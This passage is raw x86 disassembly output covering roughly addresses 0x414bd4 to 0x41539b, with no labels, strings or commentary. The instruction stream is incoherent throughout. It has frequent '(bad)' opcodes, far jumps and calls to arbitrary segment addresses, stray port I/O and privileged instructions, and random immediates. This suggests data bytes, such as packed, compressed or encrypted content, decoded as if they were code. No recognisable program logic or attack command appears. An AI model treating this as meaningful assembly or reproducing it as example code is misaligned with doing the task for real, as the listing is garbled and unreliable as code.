  414bd4:	dec    ebx
  414bd5:	dec    esp
  414bd6:	(bad)  [eax+ecx*1+0x49]
  414bda:	add    eax,0xcd41d7ea
  414bdf:	pop    edi
  414be0:	loopne 0x414c4e
  414be2:	mov    al,0xcb
  414be4:	fisub  WORD PTR [edx]
  414be6:	out    dx,eax
  414be7:	xor    DWORD PTR [edx],esp
  414be9:	shl    BYTE PTR [ebx-0x40],1
  414bec:	pop    esp
  414bed:	das    
  414bee:	aam    0xe
  414bf0:	dec    eax
  414bf1:	mov    al,al
  414bf3:	shr    DWORD PTR [ebp+eiz*1+0x7e67f5d4],1
  414bfa:	adc    DWORD PTR [ebx-0x36],ebp
  414bfd:	(bad)  
  414bff:	inc    edi
  414c00:	xor    BYTE PTR [edi+0x5c],ch
  414c03:	popa   
  414c04:	add    cl,dl
  414c06:	fisub  DWORD PTR [ebp+0x5bae6e4c]
  414c0c:	inc    edi
  414c0d:	adc    DWORD PTR [ebx+ecx*1+0x4f086dd7],0xffffff9a
  414c15:	dec    ecx
  414c16:	inc    ecx
  414c17:	xor    bl,BYTE PTR [ecx]
  414c19:	and    esi,DWORD PTR [eax]
  414c1b:	pop    ds
  414c1c:	cmc    
  414c1d:	outs   dx,BYTE PTR ds:[esi]
  414c1e:	fild   QWORD PTR [edx-0xe7644e]
  414c24:	pop    esp
  414c25:	mov    BYTE PTR [eax+0x7e6fbec8],0x17
  414c2c:	out    0x8c,eax
  414c2e:	dec    ecx
  414c2f:	adc    al,0xa9
  414c31:	inc    ebp
  414c32:	mov    ecx,DWORD PTR [ebx+0x12]
  414c35:	mov    WORD PTR [ebp+0x4cc33530],?
  414c3b:	popa   
  414c3c:	xor    DWORD PTR [ecx],0x8e45582f
  414c42:	add    DWORD PTR [edi+ebp*1],edx
  414c45:	arpl   WORD PTR [ebp-0x3a],si
  414c48:	retf   0x88a1
  414c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c4c:	push   esp
  414c4d:	jmp    0xf8ec:0xfb618861
  414c54:	push   eax
  414c55:	adc    eax,0xf1fd7fc4
  414c5a:	mov    BYTE PTR [eax+edx*8+0x7e],ch
  414c5e:	xor    al,0xa4
  414c60:	add    dl,BYTE PTR fs:[ecx+0x29]
  414c64:	dec    edi
  414c65:	jmp    0xe798:0xc5350ff4
  414c6c:	pop    ebx
  414c6d:	jecxz  0x414ce6
  414c6f:	add    BYTE PTR [ebx+0x62b9698f],0x94
  414c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c77:	mov    DWORD PTR [esi],ebp
  414c79:	mov    bl,bl
  414c7b:	inc    DWORD PTR [edx-0x5eeb66c3]
  414c81:	popf   
  414c82:	mov    ah,0x76
  414c84:	adc    BYTE PTR [edi+0x1c675c7a],0x7a
  414c8b:	push   eax
  414c8c:	arpl   si,dx
  414c8e:	mov    cl,0x71
  414c90:	xor    al,0x9f
  414c92:	and    dl,cl
  414c94:	mov    gs,esi
  414c96:	sahf   
  414c97:	push   es
  414c98:	push   edx
  414c99:	jae    0x414c36
  414c9b:	je     0x414cdc
  414c9d:	clc    
  414c9e:	lahf   
  414c9f:	popa   
  414ca0:	in     al,dx
  414ca1:	pop    esi
  414ca2:	jnp    0x414c32
  414ca4:	test   al,0x66
  414ca6:	jnp    0x414c9e
  414ca8:	jmp    0x322f:0xfbef645e
  414caf:	dec    esp
  414cb0:	mov    edx,0xc24f5ed
  414cb5:	ss call 0xb29c:0xb335693d
  414cbd:	jg     0x414d28
  414cbf:	fs loop 0x414cd1
  414cc2:	icebp  
  414cc3:	mov    edx,0xee42d2ed
  414cc8:	repz jns 0x414d09
  414ccb:	popf   
  414ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ccd:	out    dx,eax
  414cce:	push   eax
  414ccf:	adc    ecx,edi
  414cd1:	add    eax,0x2a7c974
  414cd6:	ror    dl,cl
  414cd8:	call   0x13ff:0x9a43caea
  414cdf:	xchg   edx,eax
  414ce0:	pushf  
  414ce1:	das    
  414ce2:	jbe    0x414ccd
  414ce4:	jno    0x414c7d
  414ce6:	push   ecx
  414ce7:	stos   BYTE PTR es:[edi],al
  414ce8:	push   ecx
  414ce9:	mov    esi,0x22f43d99
  414cee:	push   ebx
  414cef:	ins    BYTE PTR es:[edi],dx
  414cf0:	adc    bh,0xd0
  414cf3:	xchg   esp,eax
  414cf4:	add    BYTE PTR [ebp+0x50d04a7d],cl
  414cfa:	adc    dl,ch
  414cfc:	mov    WORD PTR [ebx+0x2d],ss
  414cff:	cdq    
  414d00:	dec    ecx
  414d01:	ins    BYTE PTR es:[edi],dx
  414d02:	sbb    ah,BYTE PTR [ebx+ecx*8+0x596984ba]
  414d09:	inc    edi
  414d0a:	stc    
  414d0b:	add    BYTE PTR [edi+0x79c89e6a],bh
  414d11:	loop   0x414d8c
  414d13:	xchg   esp,eax
  414d14:	inc    ebp
  414d15:	pop    edx
  414d16:	aas    
  414d17:	retf   0x32fb
  414d1a:	fcom   DWORD PTR [ebx+0x63900d2b]
  414d20:	sub    esp,ebx
  414d22:	add    bl,BYTE PTR [ecx]
  414d24:	repnz fdivrp st(1),st
  414d27:	xchg   BYTE PTR [ebx],ch
  414d29:	pop    edi
  414d2a:	mov    edx,0x6aaf304b
  414d2f:	rol    DWORD PTR [ebx-0x4ff948b8],1
  414d35:	das    
  414d36:	addr16 pop ss
  414d38:	push   esp
  414d39:	mov    ah,0x7f
  414d3b:	adc    eax,0xe6c8d9f8
  414d40:	pop    ecx
  414d41:	(bad)  [esi-0x23]
  414d44:	adc    BYTE PTR [ecx],dh
  414d46:	sbb    eax,DWORD PTR [ebp-0x61]
  414d49:	fst    DWORD PTR [ebp+ebp*2-0x43]
  414d4d:	inc    ebx
  414d4e:	test   eax,0x5f3d07ca
  414d53:	sar    BYTE PTR [ecx+0x5],cl
  414d56:	(bad)  
  414d57:	call   0x198c:0xdee03bcf
  414d5e:	fisttp QWORD PTR [edi+0x4d6cacf3]
  414d64:	leave  
  414d65:	nop
  414d66:	cmp    BYTE PTR [edi],0x3f
  414d69:	xchg   ebx,eax
  414d6a:	imul   ebp,DWORD PTR [ebp+0x5296c0e8],0xafb89b43
  414d74:	out    dx,al
  414d75:	jecxz  0x414d3a
  414d77:	xchg   ebp,eax
  414d78:	mov    bh,0x1b
  414d7a:	je     0x414cff
  414d7c:	(bad)  
  414d7d:	mov    cl,0x1d
  414d7f:	pop    ss
  414d80:	out    0x6c,eax
  414d82:	xchg   esp,eax
  414d83:	in     al,0x92
  414d85:	clc    
  414d86:	dec    esi
  414d87:	or     eax,0x81c3a275
  414d8c:	xchg   esi,eax
  414d8d:	jmp    0x414d3a
  414d8f:	xlat   BYTE PTR ds:[ebx]
  414d90:	mov    al,0x27
  414d92:	call   FWORD PTR [ecx+0x17]
  414d95:	jle    0x414d3a
  414d97:	jp     0x414d1b
  414d99:	adc    esi,DWORD PTR [eax]
  414d9b:	add    bh,0xa7
  414d9e:	jo     0x414df4
  414da0:	xchg   edx,eax
  414da1:	mov    edi,0xf6bb05ff
  414da6:	adc    ebp,DWORD PTR ds:0x819a0402
  414dac:	test   eax,0x6d1335af
  414db1:	cdq    
  414db2:	add    esp,DWORD PTR [esi-0x32]
  414db5:	scas   eax,DWORD PTR es:[edi]
  414db6:	and    ah,ah
  414db8:	sbb    al,0xae
  414dba:	push   ss
  414dbb:	mov    ebx,0x37057ce6
  414dc0:	test   al,0x2b
  414dc2:	aaa    
  414dc3:	popa   
  414dc4:	mov    ah,0xf1
  414dc6:	in     eax,0xc7
  414dc8:	movzx  esp,WORD PTR [esi-0x37]
  414dcc:	sub    esp,DWORD PTR [ecx-0xc]
  414dcf:	aaa    
  414dd0:	pop    edx
  414dd1:	push   edi
  414dd2:	mov    al,ds:0x471f3f1a
  414dd7:	inc    ecx
  414dd8:	shl    BYTE PTR [ebp+0x50],cl
  414ddb:	je     0x414e26
  414ddd:	jmp    0x4928:0xf71086b4
  414de4:	cmp    eax,DWORD PTR [eax]
  414de6:	mov    edi,ss
  414de8:	hlt    
  414de9:	imul   edi,DWORD PTR [esi-0xa8170ef],0xc0d924aa
  414df3:	fcmove st,st(3)
  414df5:	call   0xce2a6db7
  414dfa:	sar    DWORD PTR [ebx],cl
  414dfc:	mov    esi,0x34759484
  414e01:	daa    
  414e02:	out    0xfb,al
  414e04:	int3   
  414e05:	(bad)  
  414e07:	jne    0x414ded
  414e09:	(bad)  
  414e0a:	frstor [ebx]
  414e0c:	das    
  414e0d:	pop    esp
  414e0e:	js     0x414dfe
  414e10:	dec    esp
  414e11:	sar    BYTE PTR [ebp-0x1d],1
  414e14:	std    
  414e15:	loop   0x414dc3
  414e17:	out    0xbd,al
  414e19:	jns    0x414e26
  414e1b:	rcl    cl,1
  414e1d:	test   eax,0xb70a4a6f
  414e22:	in     al,0x55
  414e24:	sbb    al,0xe6
  414e26:	pop    ds
  414e27:	jge    0x414ea7
  414e29:	inc    ebx
  414e2a:	lahf   
  414e2b:	daa    
  414e2c:	pop    ss
  414e2d:	push   ebp
  414e2e:	pop    edi
  414e2f:	int3   
  414e30:	dec    ebp
  414e31:	and    ebp,DWORD PTR [ecx]
  414e33:	mov    ebp,0xcba73e1f
  414e38:	and    al,0x7b
  414e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e3b:	retf   0xf3af
  414e3e:	jl     0xcb13d400
  414e44:	sbb    eax,0x610242e2
  414e49:	adc    BYTE PTR [edi+0x3c4961c3],0x58
  414e50:	mov    esi,0xc706f1c0
  414e55:	sbb    dl,BYTE PTR [ecx+0x60]
  414e58:	add    BYTE PTR [ebx+0x41],cl
  414e5b:	mov    al,ds:0xd8e71be8
  414e60:	adc    al,bl
  414e62:	fmul   QWORD PTR [ecx+0x8]
  414e65:	dec    ebp
  414e66:	cmp    BYTE PTR [ebp+edx*1-0x53791c3],0xb2
  414e6e:	adc    DWORD PTR [eax],ecx
  414e70:	adc    eax,0x23f5fb68
  414e75:	dec    ebx
  414e76:	mov    ch,0xbe
  414e78:	adc    ch,ch
  414e7a:	cmc    
  414e7b:	aad    0xe4
  414e7d:	sub    cl,BYTE PTR [edx]
  414e7f:	cs loop 0x414ec6
  414e82:	mov    esi,0x7c7dd218
  414e87:	je     0x414e2b
  414e89:	sbb    eax,0x7d14cb28
  414e8e:	push   cs
  414e8f:	std    
  414e90:	mov    ds,WORD PTR [ebp-0x53d044b2]
  414e96:	fisttp WORD PTR [edx]
  414e98:	stos   BYTE PTR es:[edi],al
  414e99:	ja     0x414ecb
  414e9b:	lock xor al,dl
  414e9e:	dec    esi
  414e9f:	iret   
  414ea0:	std    
  414ea1:	mov    eax,ds:0x582cc919
  414ea6:	(bad)  
  414ea7:	loopne 0x414ec1
  414ea9:	dec    ebp
  414eaa:	data16 xor al,0x5a
  414ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eae:	out    dx,al
  414eaf:	sub    edx,ebp
  414eb1:	aaa    
  414eb2:	jmp    FWORD PTR ds:0x6785759a
  414eb8:	mov    ah,0xf7
  414eba:	test   eax,edi
  414ebc:	hlt    
  414ebd:	xchg   esi,eax
  414ebe:	push   ebp
  414ebf:	adc    DWORD PTR [edi],edi
  414ec1:	addr16 and bh,cl
  414ec4:	retfw  0xfaa6
  414ec8:	push   edi
  414ec9:	jno    0x9e25a87a
  414ecf:	and    bh,BYTE PTR [edx+0x4a61baad]
  414ed5:	sbb    eax,0xa83a00e6
  414eda:	push   esp
  414edb:	xchg   BYTE PTR [ecx+0x1d],bh
  414ede:	lea    edi,[ebx-0x43]
  414ee1:	mov    edi,0xc8537032
  414ee6:	hlt    
  414ee7:	or     eax,0xd70a5c77
  414eec:	mov    dl,0xc8
  414eee:	lods   al,BYTE PTR ds:[esi]
  414eef:	jl     0x414ea9
  414ef1:	xchg   ecx,eax
  414ef2:	pop    esp
  414ef3:	sbb    dl,al
  414ef5:	int    0x4
  414ef7:	push   edx
  414ef8:	cld    
  414ef9:	gs sub al,0x29
  414efc:	imul   ebp,DWORD PTR [esi+0x52],0x4d16577e
  414f03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f04:	xor    bl,BYTE PTR [ecx+esi*1-0x75]
  414f08:	mov    ebp,ds
  414f0a:	ins    DWORD PTR es:[edi],dx
  414f0b:	xor    DWORD PTR [eax-0x14],edi
  414f0e:	scas   al,BYTE PTR es:[edi]
  414f0f:	sub    al,0xd2
  414f11:	std    
  414f12:	out    dx,al
  414f13:	push   esi
  414f14:	cdq    
  414f15:	dec    eax
  414f16:	ins    BYTE PTR es:[edi],dx
  414f17:	inc    esi
  414f18:	dec    ebp
  414f19:	dec    esi
  414f1a:	fs stos DWORD PTR es:[edi],eax
  414f1c:	imul   esi,DWORD PTR [edx+0x4dcc45fa],0x82064e5f
  414f26:	in     al,dx
  414f27:	cmp    cl,al
  414f29:	cmp    edi,DWORD PTR [ebx-0x30]
  414f2c:	(bad)  
  414f2d:	jecxz  0x414f5b
  414f2f:	fidivr DWORD PTR [edx]
  414f31:	cmp    eax,0x4bf34f52
  414f36:	xchg   ecx,eax
  414f37:	mov    bl,0xb2
  414f39:	dec    eax
  414f3a:	push   0x5af9d7b0
  414f3f:	stos   BYTE PTR es:[edi],al
  414f40:	arpl   si,cx
  414f42:	enter  0xa5f3,0x4e
  414f46:	pop    ss
  414f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f48:	cmp    DWORD PTR [eax],0x69
  414f4b:	mov    eax,0x1627828
  414f50:	mov    ds:0x48ee149f,eax
  414f55:	test   BYTE PTR [esi+eiz*2+0x20],dl
  414f59:	sbb    DWORD PTR [ebx],eax
  414f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f5c:	scas   eax,DWORD PTR es:[edi]
  414f5d:	enter  0xe001,0xd5
  414f61:	sahf   
  414f62:	fmul   QWORD PTR [edi+0x27524e2a]
  414f68:	sub    BYTE PTR [esi-0x57],ch
  414f6b:	inc    esi
  414f6c:	push   edi
  414f6d:	fld    QWORD PTR [ebp+0x4c]
  414f70:	fistp  QWORD PTR [ebx+edx*2-0x3e]
  414f74:	sub    eax,0x732d0913
  414f79:	int3   
  414f7a:	inc    edx
  414f7b:	mov    esi,0x8291d0e8
  414f80:	adc    DWORD PTR [esi-0x59f9568e],edx
  414f86:	mov    edi,0xce1654c9
  414f8b:	nop
  414f8c:	and    al,0x3e
  414f8e:	in     eax,0xda
  414f90:	scas   eax,DWORD PTR es:[edi]
  414f91:	lahf   
  414f92:	enter  0xc80c,0x25
  414f96:	bound  ecx,QWORD PTR [edx]
  414f98:	jl     0x414f5d
  414f9a:	in     eax,dx
  414f9b:	outs   dx,DWORD PTR ds:[esi]
  414f9c:	push   es
  414f9d:	popf   
  414f9e:	push   edx
  414f9f:	aas    
  414fa0:	les    esp,FWORD PTR [edx]
  414fa2:	push   cs
  414fa3:	loop   0x414fc0
  414fa5:	inc    ebx
  414fa6:	repz mov al,ds:0x6f8d55ef
  414fac:	or     dh,BYTE PTR [edi+0x2fb88421]
  414fb2:	mov    ah,0x49
  414fb4:	lods   al,BYTE PTR ds:[esi]
  414fb5:	cmp    al,0x43
  414fb7:	pop    ds
  414fb8:	retf   0xc87e
  414fbb:	push   cs
  414fbc:	daa    
  414fbd:	jne    0x414f8d
  414fbf:	retf   0x32db
  414fc2:	add    al,0xbb
  414fc4:	pop    ebx
  414fc5:	addr16 out dx,al
  414fc7:	inc    edi
  414fc8:	ret    
  414fc9:	inc    edi
  414fca:	(bad)  
  414fcb:	sahf   
  414fcc:	sub    BYTE PTR [edi],dl
  414fce:	lods   al,BYTE PTR ds:[esi]
  414fcf:	jp     0x414fe3
  414fd1:	ins    BYTE PTR es:[edi],dx
  414fd2:	fisubr WORD PTR [ebx]
  414fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd5:	adc    dl,dh
  414fd7:	inc    DWORD PTR [edx+0x49]
  414fda:	fiadd  DWORD PTR ds:0x1009354b
  414fe0:	sbb    eax,0xd53030a1
  414fe5:	cmp    eax,eax
  414fe7:	rcl    BYTE PTR [ebx+0x4b7fda0e],cl
  414fed:	xor    al,dl
  414fef:	jecxz  0x415049
  414ff1:	xor    al,0x25
  414ff3:	ins    BYTE PTR es:[edi],dx
  414ff4:	ror    DWORD PTR [edi-0x3d],0xe3
  414ff8:	aas    
  414ff9:	(bad)  
  414ffb:	xchg   DWORD PTR [eax],esi
  414ffd:	mov    ecx,0xa59c313f
  415002:	push   0xb14e8466
  415007:	imul   edi,DWORD PTR [ecx+eax*8-0x4e],0xc
  41500c:	mov    cl,BYTE PTR [esi+0x59ad5a1d]
  415012:	sub    ch,BYTE PTR [esi-0x5]
  415015:	repz adc BYTE PTR [edx-0x65],0xf6
  41501a:	mov    ebx,0x7446052d
  41501f:	and    BYTE PTR [eax-0x56],al
  415022:	push   esp
  415023:	pop    ss
  415024:	mul    edi
  415026:	repnz test dl,dh
  415029:	jle    0x414fda
  41502b:	mov    WORD PTR [esi-0x61],es
  41502e:	pop    ebp
  41502f:	inc    edi
  415030:	retf   
  415031:	dec    edi
  415032:	sbb    bh,BYTE PTR [eax+0x479ad1d3]
  415038:	stos   DWORD PTR es:[edi],eax
  415039:	mov    dl,0xa9
  41503b:	jb     0x414fe8
  41503d:	sar    BYTE PTR [edx-0x33f79195],1
  415043:	lods   eax,DWORD PTR ds:[esi]
  415044:	mov    esp,DWORD PTR [ebx-0xc78abcb]
  41504a:	je     0x41506d
  41504c:	jmp    eax
  41504e:	add    esp,DWORD PTR [eax]
  415050:	push   edx
  415051:	jg     0x414fee
  415053:	push   esp
  415054:	xchg   edi,eax
  415055:	fcmovnu st,st(3)
  415057:	sbb    DWORD PTR [esi+eax*4-0x19],esi
  41505b:	stc    
  41505c:	jp     0x415039
  41505e:	mov    ebx,0xd67eff25
  415063:	(bad)  
  415064:	mov    dh,0x95
  415066:	xchg   ecx,eax
  415067:	js     0x41504e
  415069:	sub    BYTE PTR [ebp-0xf28f85d],0xd7
  415070:	sub    al,0x9f
  415072:	sub    BYTE PTR [eax+0x35ea019f],cl
  415078:	rcr    ebp,cl
  41507a:	fwait
  41507b:	dec    edi
  41507c:	mov    ah,0x56
  41507e:	cli    
  41507f:	hlt    
  415080:	adc    DWORD PTR [ebp-0x48],esp
  415083:	xor    DWORD PTR [edi-0x40e856c3],0x1af7fdd9
  41508d:	repz (bad) 
  41508f:	retf   
  415090:	push   edi
  415091:	push   0xffffff9f
  415093:	xchg   ecx,eax
  415094:	sbb    BYTE PTR [esi-0x6becd2ed],0x11
  41509b:	daa    
  41509c:	stos   BYTE PTR es:[edi],al
  41509d:	sbb    al,bh
  41509f:	mov    WORD PTR [edx+0x2e],ss
  4150a2:	jno    0x4150b6
  4150a4:	pop    ebx
  4150a5:	lds    edx,FWORD PTR [eax]
  4150a7:	xor    ah,ch
  4150a9:	test   eax,0x6dd374b6
  4150ae:	mov    edx,0x18a10196
  4150b3:	pushf  
  4150b4:	mov    dl,BYTE PTR fs:[ecx+0x22]
  4150b8:	mov    bl,0x8b
  4150ba:	add    BYTE PTR [edi+ebx*1-0x5f9c209c],cl
  4150c1:	dec    eax
  4150c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150c3:	enter  0xa39c,0x95
  4150c7:	fdiv   QWORD PTR [esi+0x57]
  4150ca:	mov    BYTE PTR [edx],al
  4150cc:	into   
  4150cd:	stc    
  4150ce:	lods   eax,DWORD PTR ds:[esi]
  4150cf:	imul   ebx,edi,0x29b23fbb
  4150d5:	jns    0x415060
  4150d7:	sub    eax,0x8fc0c346
  4150dc:	in     al,0x48
  4150de:	std    
  4150df:	test   DWORD PTR [esi+edx*4-0x70fd8d77],esi
  4150e6:	inc    ebx
  4150e7:	xor    DWORD PTR [esi],edi
  4150e9:	loope  0x41508b
  4150eb:	mov    cl,0x28
  4150ed:	pop    ds
  4150ee:	test   eax,0x8e43c959
  4150f3:	mov    ah,0x57
  4150f5:	popf   
  4150f6:	jmp    0x415080
  4150f8:	or     al,0xba
  4150fa:	mov    ds:0xd75e6e1e,al
  4150ff:	rol    BYTE PTR [edi],1
  415101:	fsubr  QWORD PTR [edi-0x5a6c9f6c]
  415107:	std    
  415108:	in     al,dx
  415109:	jnp    0x41510b
  41510b:	push   esp
  41510c:	fisubr WORD PTR [eax+edx*4+0x65]
  415110:	sub    DWORD PTR [edi+0x23],ecx
  415113:	nop
  415114:	mov    edi,0xeea623ba
  415119:	xor    al,0xd1
  41511b:	ret    0xb894
  41511e:	mov    dh,0x60
  415120:	dec    ecx
  415121:	lea    edi,[esi+0x56]
  415124:	mov    ch,0x65
  415126:	stos   DWORD PTR es:[edi],eax
  415127:	xor    esi,esp
  415129:	out    dx,al
  41512a:	cdq    
  41512b:	or     BYTE PTR [ebx+esi*8+0x249e464e],dl
  415132:	lods   al,BYTE PTR ds:[esi]
  415133:	out    0xf9,al
  415135:	mov    eax,0xa3f012b
  41513a:	ret    
  41513b:	ins    DWORD PTR es:[edi],dx
  41513c:	push   esp
  41513d:	loope  0x4151a5
  41513f:	mov    dl,0x40
  415141:	xor    eax,edi
  415143:	fisubr WORD PTR [ecx-0x26]
  415146:	and    ebp,DWORD PTR [ecx-0x74]
  415149:	dec    esi
  41514a:	retf   
  41514b:	call   0xd7e4:0x1916a8db
  415152:	jo     0x4151ad
  415154:	dec    edx
  415155:	sub    DWORD PTR [esi+0x9],eax
  415158:	pcmpgtw mm5,QWORD PTR [ecx]
  41515b:	cmp    DWORD PTR [edx*1-0x4291dbd5],ebp
  415162:	icebp  
  415163:	nop
  415164:	xchg   esp,eax
  415165:	cdq    
  415166:	out    0xff,al
  415168:	inc    esi
  415169:	push   ss
  41516a:	cmp    BYTE PTR [ecx+0x4e25b308],0x28
  415171:	sbb    al,0x5d
  415173:	pusha  
  415174:	int    0x65
  415176:	pop    es
  415177:	jmp    0xac45:0x17a26612
  41517e:	xchg   DWORD PTR [esi-0x5e295e79],edi
  415184:	loop   0x415194
  415186:	pop    ebx
  415187:	mov    ebx,0xe3e8924e
  41518c:	sub    BYTE PTR [esi-0x4fe3a892],dh
  415192:	jle    0x4151be
  415194:	xchg   ecx,eax
  415195:	pop    esp
  415196:	fstp   DWORD PTR [eax+0xa]
  415199:	iret   
  41519a:	push   0x26fa5f3f
  41519f:	adc    DWORD PTR [ebp+0x15],0xffffffab
  4151a3:	adc    al,0xbb
  4151a5:	je     0x4151fd
  4151a7:	cld    
  4151a8:	pop    ebp
  4151a9:	jmp    0x67d3b30b
  4151ae:	lods   al,BYTE PTR ds:[esi]
  4151af:	loope  0x4151bc
  4151b1:	jp     0x4151b8
  4151b3:	fdiv   st,st(6)
  4151b5:	loope  0x41522c
  4151b7:	dec    ecx
  4151b8:	ret    0x6cbe
  4151bb:	sbb    dl,dh
  4151bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151be:	call   0xec2e:0xf8e56430
  4151c5:	fisttp DWORD PTR [ecx-0x740fd4c7]
  4151cb:	pop    es
  4151cc:	and    DWORD PTR [ebx-0x2454eb10],eax
  4151d2:	push   cs
  4151d3:	(bad)  
  4151d5:	push   esp
  4151d6:	mov    ebp,0x657d9642
  4151db:	jo     0x41522d
  4151dd:	pop    ds
  4151de:	pushf  
  4151df:	mov    dh,0xfa
  4151e1:	sti    
  4151e2:	xlat   BYTE PTR ds:[ebx]
  4151e3:	mov    ebp,0xdac2b8b
  4151e8:	fcom   DWORD PTR [edi]
  4151ea:	in     eax,dx
  4151eb:	ins    BYTE PTR es:[edi],dx
  4151ec:	mov    bh,0x59
  4151ee:	loop   0x41519b
  4151f0:	repnz push eax
  4151f2:	and    al,0xe7
  4151f4:	mov    esi,0x7e40843c
  4151f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151fa:	outs   dx,DWORD PTR ds:[esi]
  4151fb:	outs   dx,BYTE PTR ds:[esi]
  4151fc:	out    0x1f,al
  4151fe:	shr    DWORD PTR [eax+0x21],0x28
  415202:	(bad)  
  415203:	es xor al,0x2d
  415206:	fist   DWORD PTR [eax]
  415208:	add    al,0x84
  41520a:	or     al,0xc6
  41520c:	addr16 repz inc edi
  41520f:	mov    ds:0x19da4e3d,al
  415214:	push   es
  415215:	repnz xor al,0x14
  415218:	iret   
  415219:	aam    0xb3
  41521b:	adc    al,0x38
  41521d:	popa   
  41521e:	inc    ecx
  41521f:	sub    eax,0xb49c940f
  415224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415225:	inc    ebx
  415226:	pop    eax
  415227:	pop    es
  415228:	pusha  
  415229:	jmp    0x2906:0x6a353b39
  415230:	int3   
  415231:	inc    esi
  415232:	jbe    0x41524c
  415234:	mov    ch,0x78
  415236:	mov    bh,0x52
  415238:	gs div dl
  41523b:	test   DWORD PTR [esi],ebp
  41523d:	jle    0x4151d1
  41523f:	mov    cl,0x2
  415241:	pop    eax
  415242:	out    0x85,al
  415244:	es cs jmp 0xd040eba3
  41524b:	repz cmp DWORD PTR [eax+0x6c46995f],edx
  415252:	in     eax,0xb9
  415254:	mov    dh,0xa8
  415256:	sub    dl,al
  415258:	push   bx
  41525a:	ret    0x7c0f
  41525d:	inc    esp
  41525e:	int    0x2b
  415260:	mov    ecx,0xa009c153
  415265:	or     cl,BYTE PTR [ecx+esi*1]
  415268:	dec    ecx
  415269:	xor    DWORD PTR [ecx],ecx
  41526b:	and    al,0xf
  41526d:	sbb    al,0xf7
  41526f:	jno    0x415229
  415271:	std    
  415272:	inc    ebp
  415273:	sub    ebx,DWORD PTR [esi+0x833d756]
  415279:	jae    0x4152ce
  41527b:	imul   esp,DWORD PTR [ebp-0x2fe3d2b8],0x87bdf59b
  415285:	inc    edx
  415286:	cmp    eax,0xa2c99e22
  41528b:	lahf   
  41528c:	cmp    ebp,DWORD PTR [esi]
  41528e:	aam    0x1a
  415290:	jge    0x415257
  415292:	mov    bh,0x4e
  415294:	cdq    
  415295:	fcomp  DWORD PTR [ebx-0x2a]
  415298:	sub    eax,0x1f9e1125
  41529d:	jp     0x415312
  41529f:	mov    al,0x53
  4152a1:	stc    
  4152a2:	xchg   DWORD PTR [edx+0x4d1ba80b],esp
  4152a8:	nop
  4152a9:	not    BYTE PTR [edx+0x4a3ab0be]
  4152af:	cmp    ebp,edi
  4152b1:	cmp    ch,BYTE PTR [eax-0x20]
  4152b4:	mov    ebp,0x5f903a49
  4152b9:	out    dx,eax
  4152ba:	dec    esp
  4152bb:	xor    ebx,DWORD PTR [ebp+0x614c6a4a]
  4152c1:	inc    eax
  4152c2:	jmp    0x4152fc
  4152c4:	dec    ebp
  4152c5:	xchg   esi,eax
  4152c6:	call   0xc5316b5
  4152cb:	sbb    eax,DWORD PTR [esi+0x38c7be2b]
  4152d1:	cli    
  4152d2:	dec    ebp
  4152d3:	lea    eax,[esi+edi*1-0x45]
  4152d7:	jl     0x415297
  4152d9:	test   al,0x2
  4152db:	lock cwde 
  4152dd:	loop   0x41531f
  4152df:	test   eax,0xba405699
  4152e4:	dec    ebx
  4152e5:	js     0x4152f0
  4152e7:	mov    edi,0xa3b995d2
  4152ec:	sti    
  4152ed:	out    0xde,eax
  4152ef:	hlt    
  4152f0:	iret   
  4152f1:	pop    ecx
  4152f2:	push   eax
  4152f3:	sahf   
  4152f4:	sbb    ch,BYTE PTR [ebp-0x6a7a53a8]
  4152fa:	jl     0x41533c
  4152fc:	cld    
  4152fd:	adc    eax,0x7017ffb9
  415302:	ror    BYTE PTR ds:0x486c9341,0xf7
  415309:	mov    eax,tr3
  41530c:	inc    ebx
  41530d:	jns    0x4152d2
  41530f:	retf   0xf07b
  415312:	or     cl,BYTE PTR [eax]
  415314:	je     0x41531c
  415316:	ins    BYTE PTR es:[edi],dx
  415317:	lds    esp,FWORD PTR [edx+0x3d609f3f]
  41531d:	repnz lods eax,DWORD PTR ds:[esi]
  41531f:	aam    0xa4
  415321:	cmp    BYTE PTR [edi-0x76],cl
  415324:	mov    dh,dl
  415326:	or     cl,BYTE PTR [eax+0x79]
  415329:	adc    ah,BYTE PTR [ebp-0x1e]
  41532c:	cmp    eax,esp
  41532e:	jns    0x41539e
  415330:	cmp    eax,0x3544f76f
  415335:	es jl  0x4153b0
  415338:	cli    
  415339:	int    0x1c
  41533b:	(bad)
  41533e:	stos   BYTE PTR es:[edi],al
  41533f:	dec    ebx
  415340:	pop    ebp
  415341:	(bad)  
  415342:	or     al,0x8
  415344:	mov    ds:0x37a3181,al
  415349:	mov    WORD PTR [esi+0x16],ds
  41534c:	aad    0x6b
  41534e:	cli    
  41534f:	mov    ecx,0xcc32edff
  415354:	bound  ebx,QWORD PTR [edi+0x5cc348a9]
  41535a:	add    eax,0xfd5013a9
  41535f:	jae    0x4153b5
  415361:	xor    cl,BYTE PTR [eax]
  415363:	rcr    esi,1
  415365:	pushf  
  415366:	scas   al,BYTE PTR es:[edi]
  415367:	enter  0xe434,0x6e
  41536b:	out    dx,al
  41536c:	jae    0x415332
  41536e:	inc    ecx
  41536f:	jecxz  0x415395
  415371:	daa    
  415372:	test   ah,cl
  415374:	(bad)  
  415375:	sub    DWORD PTR [ebx],ebx
  415377:	bound  edi,QWORD PTR [ebx-0x212017ac]
  41537d:	(bad)  
  41537e:	test   eax,0xbab75124
  415383:	hlt    
  415384:	dec    edx
  415385:	mov    BYTE PTR [edi],bh
  415387:	mov    edx,DWORD PTR [ecx-0x402d5adc]
  41538d:	je     0x415387
  41538f:	fnsave [ebx]
  415391:	jge    0x415347
  415393:	stos   DWORD PTR es:[edi],eax
  415394:	enter  0x6f76,0x64
  415398:	cmp    al,0x55
  41539a:	pop    esi
  41539b:	lock inc ecx
